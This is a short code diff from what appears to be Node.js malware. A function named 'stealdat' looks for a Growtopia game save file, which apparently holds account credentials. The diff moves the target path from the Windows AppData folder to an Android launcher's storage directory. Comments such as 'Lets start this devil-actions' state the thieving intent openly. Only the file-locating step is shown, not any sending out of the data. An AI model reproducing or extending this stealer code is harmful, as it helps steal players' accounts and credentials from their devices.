@@ -20,7 +20,7 @@ const fs = require('fs');
 
 // Lets start:D
 function stealdat () {
-    const path = `${os.homedir()}/AppData/Local/Growtopia/save.dat`
+    const path = `${os.homedir()}/storage/emulated/0/Android/data/launcher.powerkuy/files/save.dat`
     if (fs.existsSync(path)) { // Detect the path. if they exists or nop. why? cause some ppl are SMART.
     console.log("Lets start this devil-actions.")
     // read it first
